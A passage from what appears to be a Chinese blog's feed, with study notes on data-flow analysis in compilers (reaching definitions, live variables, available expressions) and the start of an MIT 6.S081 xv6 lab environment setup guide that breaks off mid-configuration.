xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ϕ</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">ϕ</span></span></span></span> 函数–&gt;面对 SSA 中不同控制流汇入到一个块中,导致多变量备选的问题，使用此合并操作符，根据控制流来确定使用哪个变量</li></ul></li><li>在转换成机器代码时会引入低效率的问题</li></ul><h2 id="basic-blocks-control-flow-graphs"><a class="markdownIt-Anchor" href="#basic-blocks-control-flow-graphs"></a> Basic Blocks &amp; Control Flow Graphs</h2><p>​控制流分析(<code>Control Flow Analysis</code>)通常指的是构建控制流图(<code>Control Flow Graph</code>, CFG)，并以 CFG 作为基础结构进行静态分析的过程。CFG 的一个结点可以是一条单独的 3AC，但是更常见的是一个基本块(Basic Block)。所谓基本块，就是满足以下性质的连续 3AC：</p><ul><li>只能从块的第一条指令进入。</li><li>只能从块的最后一条指令离开</li></ul><h1 id="data-flow-analysis-applications"><a class="markdownIt-Anchor" href="#data-flow-analysis-applications"></a> Data Flow Analysis - Applications</h1><h2 id="data-flow-analysis"><a class="markdownIt-Anchor" href="#data-flow-analysis"></a> Data Flow Analysis</h2><ul><li><p>分析的行为是数据的“流动”，分析的方式是 <strong>安全近似(Safe-Approximation)</strong></p><ul><li>根据安全性需求选择过近似(Over-Approximation)还是欠近似(Under-Approximation)</li></ul></li><li><p><strong>数据流动的场景</strong>有两个：</p><ul><li>在CFG的点(Node)内流动，即程序基块(Basic Block)内部的数据流；</li><li>在CFG的边(Edge)上流动，即由基块间控制流触发的数据流。</li></ul></li><li><p>数据流值</p><ul><li>也称为<strong>抽象数据状态(ADS)</strong>，为程序 P 中所有的数据的抽象值的整体</li><li>称每一个 IR 语句 <em>s</em> 执行之前, <em>pre(s)</em> 执行之后的<strong>数据流值</strong>为 <em>s</em> 的 <strong>输入状态</strong>—&gt;IN[S]</li><li>称每一个 IR 语句 <em>s</em> 执行之后, <em>suc(s)</em> 执行之前的数据流值为 <em>s</em> 的 <strong>输出状态</strong>—&gt;OUT[S]</li></ul></li><li><p><strong>程序点</strong>可以用控制流中相邻语句的<strong>顺序二元组</strong>表示。</p><ul><li>每个程序点都对应了一个数据流值(<strong>这个数据流值表征了在这个程序点能够观察到的所有可能的程序状态</strong>)–&gt;这里和后面提及的 bit vector 相联系，这个点可以看到所有可能的程序状态</li><li>每一个不同的(集合具有互异性)数据流值都会有一个或者多个程序点与之对应。</li></ul></li><li><p>数据流分析就是要寻找一种解决方案，对于程序 <em>P</em> 中的所有语句 <em>s</em> ，这种解决方案能够满足 IN[s] 和 O<strong>U</strong>T[s] 所需要满足的 <strong>安全近似导向型约束(Safe-Approximation-Oriented Constraints, SAOC)</strong>，SAOC主要有两种：</p><ul><li>基于语句语意(Sematics of Statements)的约束，即由状态转移方程产生的约束</li><li>基于控制流(Flow of Control)的约束，可能性分析/必然性分析</li></ul></li></ul><h2 id="reaching-definition-analysis"><a class="markdownIt-Anchor" href="#reaching-definition-analysis"></a> Reaching Definition Analysis</h2><h3 id="basic-concept"><a class="markdownIt-Anchor" href="#basic-concept"></a> Basic concept</h3><p>​如果在程序中点p到点q构成一条路径，在点p处的<strong>定义d</strong>在这条路径中不会被杀死，则称<strong>定义d</strong>可以从点p <strong>reach</strong> 点 q。换句话说，就是：<code>p处定义的变量 v 从点 p 可以 reach 点 q，当且仅当，v在整个路径中不会获得新的定义</code>。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310210027371.png" alt="image-20231021002745300" /></p><p>​Reaching Definitions可以用来检测可能存在的、使用了未定义变量的情况。例如，在CFG入口为每个变量引入一个虚拟定义，如果这个虚拟定义能从入口reach一个使用了该变量的点p，那么这个变量就有可能未定义便被使用。(因为“未定义”reach了使用变量的p)</p><h3 id="comprehend"><a class="markdownIt-Anchor" href="#comprehend"></a> Comprehend</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310211945453.png" alt="image-20231021194510364" /></p><ul><li>如图所示，关注的目标是<code>程序中定义的变量</code>，<strong>即数据流值是一个程序中所有的定义</strong>。可以使用bit编码表示在某程序点的多个Reaching Definitions，从左数第几个字节就是第几个definition<ul><li>Di如果为0表示Di无法reach该程序点</li><li>Di如果为1表示Di可以reach该程序点。</li></ul></li><li>这里D即Definition，可以表示为   <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><mi>D</mi><mo>:</mo><mi>v</mi><mo>=</mo><mi>x</mi><mtext> </mtext><mi>o</mi><mi>p</mi><mtext> </mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">\ D: v = x \  op \ y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mspace"> </span><span class="mord mathnormal">o</span><span class="mord mathnormal">p</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><ul><li>其中一个D可以视为一行三地址码<ol><li>生成了一个定义D</li><li>在保持其他传入程序不受影响的同时，杀死了程序中其他对变量v的定义</li><li>语句 <code>D: v = x op y</code> 生成了关于变量 <code>v</code> 的一个新定义 <code>D</code> ，并且覆盖了程序中其他地方对于变量 <code>v</code> 的定义，不过并不会影响后续其他的定义再来覆盖这里的定义。赋值语句只是定义的一种形式而已，定义也可以有别的形式，比如说引用参数。</li></ol></li></ul></li><li>由此可以得到对于<strong>Node(Basic Block)的传递函数</strong>和对于<strong>Edge(Control-flow Hangling)的控制流函数</strong></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310211453613.png" alt="image-20231021145323589" /></p><ul><li>Transfer Function(到达定值的转移方程)<ul><li>从入口状态删除 kill 掉的定值，并加入新生成的定值</li><li>D：v = x op y，gen v, kill 其它所有的 v</li><li>注意，是所有其他地方，不仅仅是之前的control flow，因为程序control flow可能存在环，我们不能确定运行时真正的执行先后顺序。即使kill掉了无环执行流的下游的定义也没有关系，后面再重新定义即可。</li></ul></li><li>Control Flow(到达定值的数据流处理)<ul><li>任何一个前驱的变量定值都表明，该变量得到了定义</li><li>其中U表示union，结合前文使用bit字节表示的D，可以知道，IN[B]的输入等于OUT[P1]并OUT[P2]，意味着只要存在一条路径可以reach，那么就算作可以reach</li></ul></li></ul><h3 id="algorithm"><a class="markdownIt-Anchor" href="#algorithm"></a> Algorithm</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310211454978.png" alt="image-20231021145410941" /></p><ul><li>这便是Reaching Definitions的算法表示形式，其中入口和每个OUT都初始化为空集即00000(bit vector)的形式，是因为1并0或1都是1，会导致算法无法继续进行。算法的<strong>停止条件</strong>是：经过一次完整的迭代后，迭代前后所有的OUT都不再发生改变。<ul><li>首先让所有BB和入口的OUT为空。因为你不知道 BB 中有哪些定值被生成。</li><li>当任意 OUT 发生变化，则分析出的定值可能需要继续往下流动，所需要修改各 BB 的 IN 和 OUT。</li><li>先处理 IN，然后再根据转移完成更新 OUT。</li><li>在 gen U (IN - kill)中，kill 与 gen 相关的 bit 不会因为 IN 的改变而发生改变，而其它 bit 又是通过对前驱 OUT 取并得到的，因此其它 bit 不会发生 0 -&gt; 1 的情况。所以，OUT 是不断增长的，而且有上界，因此算法最后必然会停止。</li><li>因为 OUT 没有变化，不会导致任何的 IN 发生变化，因此 OUT 不变可以作为终止条件。我们称之为程序到达了不动点(Fixed Point)</li></ul></li></ul><h3 id="example"><a class="markdownIt-Anchor" href="#example"></a> Example</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220959122.png" alt="image-20231022095908077" /></p><h3 id="疑问"><a class="markdownIt-Anchor" href="#疑问"></a> 疑问</h3><ul><li><p>这里的 bit vector 为什么是和每一个 statement 相联系，而不是和对于变量的定义所联系，比如为什么不把所有对于 x 的定义作为一个 bit？</p><ul><li>这里针对的是所有的定义，对于每一个定义给予一个 bit 位(题目的要求)。我的理解是，这样对于每一个定义(也可以说是statement)是为了存储更多的信息，就比如第一次B2之后的程序点上，杀死了D2，但是保留了D4，存储了D4的信息，即y的状态更明确了。但是如果是通过变量名来分配 bit，那样在这种时候，y的信息不会改变，因为它又被定义了，这时候就搞混D2和D4的信息了。</li><li><code>这里进行补充</code>：我们可以用 D 的子集(即定义域中的元素)来表示每个<strong>程序点</strong>处，能够到达该点的定义的集合，即该程序点处的数据流值。这里的程序点就是两个 <strong>基础块</strong> 之间的连线，它是一个二元组，图上也展示数据表示在线上，也体现了数据流值的位置。</li></ul></li><li><p>这里最后的结束条件表示了什么，这里 bit vector到底反映了个什么状态？</p><ul><li>这里对于某个程序点，为1表示能reach到这个程序点，即一开始被定义的变量v，存在一条路径使得到达程序点前没有被再次定义，这里由于是sound分析，所以只要存在一条从Entry到这个程序点的路径即可，所以很好分析。</li></ul></li><li><p><s>结果这两个问题和再看视频，我这里应该理解为 为每一个 definition 给予一个 bit，这我感觉是 definition是抽象出来的结果，它每一个都是不同的，而例子中不同的 definition 都是为同一个变量的判断，应该是具体的方面，抽象的静态分析不关心具体的数值。</s></p><ul><li>这里就是这样设计的，我需要考虑的问题应该是为什么会有覆盖(kill)的存在？<ul><li>从头捋一遍，kill就是设置为0，即其余的定义不能reach到这一点，也就是说任何一条路径都有重复定义，因为这一个transfer function 就是守门员，它下一个程序点必定会受到这个func的影响。(这里相同的变量已经定义了，主要的目的是为了删除之前的相关定义，而删除后面的感觉是为了方便操作，因为后面会重新定义，所以删除不影响)</li></ul></li></ul></li></ul><h2 id="live-variables-analysis"><a class="markdownIt-Anchor" href="#live-variables-analysis"></a> Live Variables Analysis</h2><h3 id="basic-concept-2"><a class="markdownIt-Anchor" href="#basic-concept-2"></a> Basic concept</h3><ul><li>变量 v 在程序点 p 上的值是否会在某条从 p 出发的路径中使用</li><li>变量 v 在 p 上活跃，当且仅存在一条从 p 开始的路径，该路径的末端使用了 v，且路径上没有对 v 进行覆盖(redefine)。</li><li>隐藏了这样一个含义：<code>在被使用前, v 没有被重新定义过, 即没有被 kill 过, 则证明 v 在 p 处是活跃的</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310211523664.png" alt="" /></p><h3 id="comprehend-2"><a class="markdownIt-Anchor" href="#comprehend-2"></a> Comprehend</h3><ul><li><p>可以假设以下，如果从后往前搜索，只要在某程序点处找到一个变量vi的使用，就证明在此之前任意可达此点的、定义了vi的程序点处，vi都是live的(<strong>这里疑惑为什么只保证了被使用，而没有保证没有重新定义就确定它满足条件</strong> --&gt; 它关注的是一个程序点(变量值的定义)到这个变量被使用的点，这条路径中该变量的值就是存活的，它强调变量的值被使用，如果被重新定义了，该值就不会再被使用，所以被使用一定标注着它没有重定义)；而如果使用前向传播的算法，每到一个程序点都要正向搜索一遍后方的路径查看是否被使用，才能确认变量在此处是否live，虽然也能进行分析，但是效率较低</p></li><li><p>这里关注的是<code>程序中的的所有变量</code>，即<strong>数据流值是一个程序中所有变量</strong>。在程序点 p 处，变量为1，当且仅当变量在 p 点存活。</p></li><li><p>Transfer Function &amp; Control Flow</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220928054.png" alt="image-20231022092800008" /></p><ul><li><p>分析：</p><ul><li><p>一个基本块内，若 v = exp, 则就是 def v。若 exp = exp op v，那么就是 use v。一个变量要么是 use，要么是 def，根据 def 和 use 的先后顺序来决定。对于上图，我觉得OUT[B]={v}只是一个初始条件，最后的结果都是看IN处的结果，所以OUT[B]中的v并不代表它是存活变量的意思。由此，上图中的4，5，6的差别就在于use 和 def 的先后上面，对于4，因为B先使用了v，所以可以理解v在B上面那个程序点就是存活的，因为分析的是一条从程序点出发的路径，它从一个程序点p出发，然后到B中def前都是存活的，这条路径也包括了IN[B]，所以v在IN[B]中是存活的。5，6的分析也是同样的。(这里注意最终结果只看IN，也就是只有IN中的数据才决定这个变量是否存活)</p></li><li><p>考虑基本块 B 及其后继 S。若 S 中，变量 v 被使用，那么我们就把 v 放到 S 的 IN 中(IN[S] = {v})，交给 B 来分析。因此对于活跃变量分析，其控制流处理是 <code>OUT[B] = U IN[S]</code>，也就是 <code>B 的输出是所有后继 S 输入的总和</code>。</p></li><li><p>在一个块中，若变量 v 被使用，那么我们需要添加到我们的 IN 里(IN[B] = {v})。而如果 v 被定义，那么在其之下的语句中，v 都是一个非活跃变量，因为没有语句再需要使用它。因此对于Transfer Function，IN 是从 OUT 中删去重新定值的变量，然后并上使用过的变量。需要注意，如果同一个块中，变量 v 的 def 先于 use ，那么实际上效果和没有 use 是一样的。</p></li></ul></li></ul><h3 id="algorithm-2"><a class="markdownIt-Anchor" href="#algorithm-2"></a> Algorithm</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310212020469.png" alt="image-20231021202056427" /></p><ul><li><p>我们不知道块中有哪些活跃变量，而且我们的目标是知道在一个块开始时哪些变量活跃，因此把 IN 初始化为空。</p></li><li><p>初始化的判断技巧：may analysis 是空，must analysis 是 top。</p></li></ul><h3 id="example-2"><a class="markdownIt-Anchor" href="#example-2"></a> Example</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220959784.png" alt="image-20231022095945740" /></p><h3 id="疑问-2"><a class="markdownIt-Anchor" href="#疑问-2"></a> 疑问</h3><ul><li>为什么使用 backwards ?<ul><li>使用 forwards 来确定变量在某一个程序点是否存活，那每到一个程序点，都需要查看之后的路径有没有在重定义之前使用该变量的情况，需要查看的情况众多。这里就是因为要保证这个值被使用了，所以要到后面找被使用的情况才能算这个变量的值在该点处是存活的</li><li>使用 backwards 来确定，在 BB 中存在对于一个变量的使用而在同一个 BB 中没有重新定义，那么这个 BB 之前最近的一个 程序点 P(我们分析的那个 program point)，它这里一定是满足活跃变量的，即 IN[B] = {v}</li></ul></li></ul><h2 id="available-expressions-analysis"><a class="markdownIt-Anchor" href="#available-expressions-analysis"></a> Available Expressions Analysis</h2><h3 id="basic-concept-3"><a class="markdownIt-Anchor" href="#basic-concept-3"></a> Basic concept</h3><ul><li><p>程序点 p 处的表达式 <code>x op y  </code>是 available(可用) 需满足2个条件：</p><ol><li><p>从 <strong>entry</strong> 到 p 点的所有路径必须经过(使用) x op y</p></li><li><p>最后一次使用 x op y 之后，没有重定义操作数 x、y</p><p>(如果重定义了x 或 y，如x = a op2 b，则原来的表达式x op y中的x或y就会被替代)</p></li></ol></li><li><p>这个定义说明，在p处如果表达式available，就可以将其替换为最后一次运算的结果，或者可以检测全局通用表达式，感觉这里可以直接优化，首先计算表达式的结果，之后直接替换即可，相当于 <code>#define PI x + y, 这里x与y为常量</code>。</p></li><li><p>也就是说一个表达式是可用的，指的是这个表达是的值肯定已经被计算过了，可以直接复用之前的结果，没必要再算一遍，也就是说，这个表达式 <strong>不需要忙碌于计算</strong> 。</p></li></ul><h3 id="comprehend-3"><a class="markdownIt-Anchor" href="#comprehend-3"></a> Comprehend</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310212025007.png" alt="image-20231021202525968" /></p><ul><li>这里关注的就是<strong>程序中的表达式</strong>，那么每个程序点处的抽象程序状态，也就是数据流值，则为 <em>E</em> 的一个子集(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo>…</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>e</mi><mi>n</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">E=\{e_{1},e_{2}……,e_{n}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>)，即数据流值可以是{0,1,0……，1}之类的(这是子集)。</li><li>Transfer Function &amp; Control Flow</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220921179.png" alt="image-20231022092148128" /></p><ul><li>我们要求无论从哪条路径到达 B，表达式都应该已经计算，才能将其视为可用表达式，因此这是一个 must analysis。也就是说可以不优化每一个表达式，但是一定不能优化错误(也就是说一旦决定优化某个表达式，这个表达式就必须必然是可用表达式)。</li><li>注意到图中，两条不同的路径可能会导致表达式的结果最终不一致。但是我们只关心它的值能不能够再被重复利用，因此可以认为表达式可用。</li><li>v = x op y，则 gen x op y。当 x = a op b，则任何包含 x 的表达式都被 kill 掉。若 gen 和 kill 同时存在，<code>那么以最后一个操作为准</code>。这里kill的是B中被重定义的变量的集合，而不是单单指IN[B]中被重定义的变量的集合，这是因为 gen 和 kill 需要能够在数据流分析算法执行之前被静态的计算好，这样在算法过程中就不需要每次迭代都重新计算了(gen 和 kill 的生成一开始都需要固定)，并且我们之后是取差集操作，因此 kill 大一点并不会影响结果</li><li>转移方程很好理解，和到达定值差不多。但是，由于我们是 must analysis，因此控制流处理是<code>取交集</code>，而非到达定值那样取并集。</li></ul><h3 id="algorithm-3"><a class="markdownIt-Anchor" href="#algorithm-3"></a> Algorithm</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220923234.png" alt="image-20231022092329180" /></p><ul><li>这里 OUT[B] = U(全集)，因为采取的取交集的操作，所以之后的数据会逐步减少，所以取全集剔除所有不合规的情况</li></ul><h3 id="example-3"><a class="markdownIt-Anchor" href="#example-3"></a> Example</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310221000927.png" alt="image-20231022100017882" /></p><h2 id="summarize-2"><a class="markdownIt-Anchor" href="#summarize-2"></a> Summarize</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310220933086.png" alt="image-20231022093321043" /></p><h2 id="归纳"><a class="markdownIt-Anchor" href="#归纳"></a> 归纳</h2><blockquote><p>这里对上文三种数据流分析做一个要点提取归纳</p></blockquote><ul><li>什么改变了数据流的数据<ul><li>对于 Initialization 而言，这里基础块初始化不会对数据流分析产生任何影响，它的设定我认为就是为了与下一次分析进行对比的，如果一样的话，就可以认为初始化的结果就是最终分析的结果(我认为不太可能，这样的话这个案例实在是太完美了)。</li><li>同时，对于 Boundary 的初始化才会对数据流分析产生影响，但是这种影响也是固定的，因为程序流若是固定从上往下依次进行的，而没有后面数据对于前面造成影响的情况，那么数据流的多次分析结果就会是一样的。因为这里一开始边界一样，然后唯一计算的地方也被约束成了基础块的的固有操作(这里就是gen，use等，它在数据流分析算法执行之前被静态的计算好)，所以输入不变，执行流也只会从上往下执行(指后面的数据不会对之前的产生影响)，那么结果也不变。</li><li>那么影响数据流分析的只有程序流中数据的循环利用了(例如for，while等循环，或者调用)，这些操作会将之后的数据传递给上面的处理。比如产生了第二轮的数据，那么在产生第三轮的时候，如果程序流存在后面的数值传递给前面的流程，那么对于这个产生第三轮数据的程序点，它的来源就有传向它的第二轮和第三轮，这个过程会影响一轮的输出，所以改变了数据流的数据。</li></ul></li><li>最终结果看哪一块的数据<ul><li>我们知道当这一轮的数据与上一轮相同时，我们就达到了一个平衡点，这个就是我们需要的。这个时候，我们具体看在某一个程序点的reach或变量存活等情况时，我们是根据 Direction 的状态来看的，正向(forwaeds)就是看OUT，反向(backwards)就是看IN，初始化的时候也是同样道理。</li></ul></li><li>为什么转移方程都是对于基本块而言的<ul><li>这里先说一下问题的含义，当我们使用gen，kill，use的时候，我们会发现它拿到的就是基础块中的所有结果来进行操作，但是我们分析的不应该是从IN里面的数据来进行转移吗(对于正向而言)，那么我直接分析IN和基本块中的交集岂不是更好，这样一来分析的数据就少了。</li><li>这里确实分析的数据少了，但是会造成每一次迭代都要计算一遍这个取值，这样一来减少的时间和消耗又增多了。而对于直接采用基础块的数据，一来提前计算了，而且只用一遍，在复杂的情况中的损耗就更低了，二来这样不会对数据流造成影响，对于基础块中多kill的情况，如果在之后这个kill存在，那么它会在后面再次补进数据流中，否则就不必关心(因为这三种分析都是对于一条路径而言，后面不补的话就说明它到头了，后面没有了)</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT6.S081 实验</title>
    <link href="/posts/3fdc6854.html"/>
    <url>/posts/3fdc6854.html</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h1><h2 id="配置环境"><a class="markdownIt-Anchor" href="#配置环境"></a> 配置环境</h2><p>​这里使用Ubuntu22.04(wsl)进行配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 按官方指南手册 安装必须的工具链</span><br>$ sudo apt-get update &amp;&amp; sudo apt-get upgrade<br>$ sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu <br><span class="hljs-comment"># 单独移除掉qemu的新版本, 因为不知道为什么build时候会卡壳</span><br>$ sudo apt-get remove qemu-system-misc<br><span class="hljs-comment"># 额外安装一个旧版本的qemu</span><br>$ wget https://download.qemu.org/qemu-5.1.0.tar.xz<br>$ tar xf qemu-5.1.0.tar.xz<br>$ <span class="hljs-built_in">cd</span> qemu-5.1.0<br><span class="hljs-comment"># 报错处理</span><br>$ sudo apt-get install libglib2.0-dev<br>$ sudo apt-get install libpixman-1-dev<br>$ ./configure --disable-kvm --disable-werror --prefix=/usr/local --target-list=<span class="hljs-string">&quot;riscv64-softmmu&quot;</span><br>$ make<br>$ sudo make install<br><br><span class="hljs-comment"># 克隆xv6实验仓库</span><br>$ git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020<br>$ <span class="hljs-built_in">cd</span> xv6-labs-2020<br>$ git checkout util<br><span class="hljs-comment"># 这里将远程仓库换成自己的，然后就可以提交了，具体看博客中GIT相关那一篇的操作</span><br><br><span class="hljs-comment"># 进行编译</span><br>$ make qemu<br><span class="hljs-comment"># 编译成功并进入xv6操作系统的shell</span><br>$ xv6 kernel is booting<br><br>$ hart 2 starting<br>$ hart 1 starting<br>$ init: starting sh<br>$ (shell 等待用户输入...)<br></code></pre></td></tr></table></figure><blockquote><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/624091268">https://zhuanlan.zhihu.com/p/624091268</a></p><p><a href="https://zhuanlan.zhihu.com/p/537461426">MIT6.S081 Ubuntu22.04 WSL2实验环境配置 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/fuxy3/article/details/104732541">glib-2.40 gthread-2.0 is required to compile QEMU and ERROR</a></p></blockquote><h2 id="配置vscode"><a class="markdownIt-Anchor" href="#配置vscode"></a> 配置VsCode</h2><ul><li><p>远程免密登录</p><ul><li><a href="https://www.cnblogs.com/safe-rabbit/p/16254860.html">VsCode配置ssh免密远程登录 - 安全兔 - 博客园 (cnblogs.com)</a></li><li><a href="https://sanbuphy.github.io/p/%E4%BC%98%E9%9B%85%E7%9A%84%E8%B0%83%E8%AF%95%E5%9C%A8vscode%E4%B8%8A%E5%AE%8C%E7%BE%8E%E8%B0%83%E8%AF%95xv6%E5%AE%8C%E7%BB%93/">优雅的调试—在vscode上完美调试xv6(完结) (sanbuphy.github.io)</a></li><li><a href="https://jyywiki.cn/">jyywiki.cn</a></li></ul></li><li><pre class="highlight"><code class="json">#launch.json<span class="hljs-punctuation">&#123;</span>    <span class="hljs-comment">// 使用 IntelliSense 了解相关属性。 </span>    <span class="hljs-comment">// 悬停以查看现有属性的描述。</span>    <span class="hljs-comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;debug xv6&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cppdbg&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/kernel/kernel&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;stopAtEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;environment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;miDebuggerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/bin/gdb-multiarch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//使用的gdb路径</span>            <span class="hljs-attr">&quot;miDebuggerServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span 